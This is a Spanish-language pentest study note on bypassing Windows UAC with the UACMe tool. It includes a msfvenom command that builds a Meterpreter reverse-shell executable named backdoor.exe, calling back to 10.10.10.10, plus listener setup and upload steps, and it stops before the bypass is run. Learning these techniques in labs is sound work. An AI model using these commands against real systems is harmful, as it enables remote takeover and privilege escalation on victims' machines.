21-03-2025 20:43
Status: #idea
Tags: [[Windows Privilege Escalation]]

# Bypassing UAC (UACMe)

UAC es una herramienta de Windows que permite solicitar permisos del administrador para realizar ciertas acciones.

Básicamente, permite indicarle a Windows que el usuario está seguro de que quiere ejecutar el programa.

Para conseguir saltarnos UAC, necesitaremos acceso a una cuenta de usuario que esté en el grupo de local administrators.

Como en la elevación de permisos, las técnicas van a cambiar dependiendo de la versión que usemos de Windows.

Para verificar que usuarios hay en la máquina, y cuales forman parte del grupo de administradores podremos usar estos comandos en un shell:

```shell
net user
net localgroup administrators
```

Si estamos en un meterpreter, habrá que spawnear una shell antes, con el comando **shell**.

Para verificar que UAC está funcionando correctamente, podremos intentar cambiar la contraseña de algún admin, por ejemplo:

```shell
net user admin password123
```

## Uso de UACMe

[UACMe](https://github.com/hfiref0x/UACME) es una herramienta que nos ayudará a saltarnos esta comprobación de Windows.

Tendremos que generar un payload con msfvenom:

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1234 -f exe > backdoor.exe
```

Posteriormente, tendremos que crear un listener, para lo que usaremos **multi/handler**, poniendo la payload **windows/meterpreter/reverse_tcp**, poniendo el LHOST y LPORT como siempre.

Si no existe el directorio Temp, tendremos que navegar a C: y crearlo, y posteriormente, subir en la máquina que tenemos el meterpreter nuestro backdoor.exe con el comando upload, además del Akagi64 o Akagi32 de UACMe.

```shell
upload backdoor.exe
upload Akagi64.exe
```

---
# Backlinks

```dataview
LIST
FROM [[]]
SORT file.name ASC
```
